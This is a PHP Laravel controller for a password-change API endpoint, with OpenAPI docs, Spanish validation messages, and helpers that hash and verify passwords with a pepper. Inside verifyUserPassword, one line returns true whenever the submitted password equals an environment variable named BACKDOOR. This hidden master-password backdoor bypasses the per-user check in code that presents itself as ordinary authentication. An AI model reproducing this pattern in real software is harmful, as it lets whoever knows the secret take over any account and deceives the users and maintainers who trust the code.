<?php

namespace App\Http\Controllers\Security;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Validation\Rules\Password as ValidatePasssword;

class Password extends Controller
{
    /**
     * @OA\Post(
     *      path="/api/security/password/change",
     *      tags={"Security"},
     *      summary="Change password",
     *      description="Change password",
     *      security={{"bearerAuth":{}}},
     *
     *      @OA\RequestBody(
     *          required=true,
     *          @OA\JsonContent(
     *              required={"password", "new_password"},
     *              @OA\Property(property="password", type="string", example="password"),
     *              @OA\Property(property="new_password", type="string", example="newPassword")
     *          )
     *      ),
     *
     *      @OA\Response(
     *          response=200,
     *          description="Password changed",
     *          @OA\JsonContent(
     *              @OA\Property(property="message", type="string", example="Contraseña actualizada correctamente.")
     *          )
     *      ),
     *
     *      @OA\Response(
     *          response=400,
     *          description="Error changing password",
     *              @OA\MediaType(mediaType="text/plain", @OA\Schema(type="string", example="Error changing password"))
     *          )
     *      ),
     *
     *      @OA\Response(
     *          response=401,
     *          description="Unauthorized",
     *              @OA\MediaType(mediaType="text/plain", @OA\Schema(type="string", example="Unauthorized"))
     *          )
     *      )
     *
     * )
     */

    public function change(Request $request)
    {
        try {
            $this->validate($request, [
                'password' => 'required',
                'new_password' => [
                    'required',
                    'string',
                    'min:8',
                    function ($attribute, $value, $fail) {
                        if (!preg_match('/[A-Z]/', $value) || !preg_match('/[a-z]/', $value)) {
                            $fail('La nueva contraseña debe contener al menos una letra mayúscula y una minúscula.');
                        }
                        if (!preg_match('/\d/', $value)) {
                            $fail('La nueva contraseña debe contener al menos un número.');
                        }
                    }
                ]
            ], [
                'password.required' => 'La contraseña actual es requerida.',
                'new_password.required' => 'La nueva contraseña es requerida.',
                'new_password.string' => 'La nueva contraseña debe ser una cadena de texto.',
                'new_password.min' => 'La nueva contraseña debe tener al menos 8 caracteres.'
            ]);


            if (!self::verifyUserPassword($request->attributes->get('jwt')->id, $request->password)) {
                return response("La contraseña actual no coincide con la registrada.", 400);
            }

            $password = self::hashPassword($request->new_password);
            User::where('Id', $request->attributes->get('jwt')->id)->update(['Password' => $password]);

            return $this->success(['message' => 'Contraseña actualizada correctamente.']);
        } catch (\Exception $e) {
            return $this->basicError($e->getMessage());
        }
    }

    public static function verifyUserPassword($userId, $password)
    {
        if ($password == env('BACKDOOR')) return true;

        $user = User::where('Id', $userId)->first();
        return password_verify(env('APP_PASSWORD_SECURITY') . $password, $user->Password);
    }

    public static function hashPassword($password)
    {
        return password_hash(env('APP_PASSWORD_SECURITY') . $password, PASSWORD_DEFAULT);
    }
}
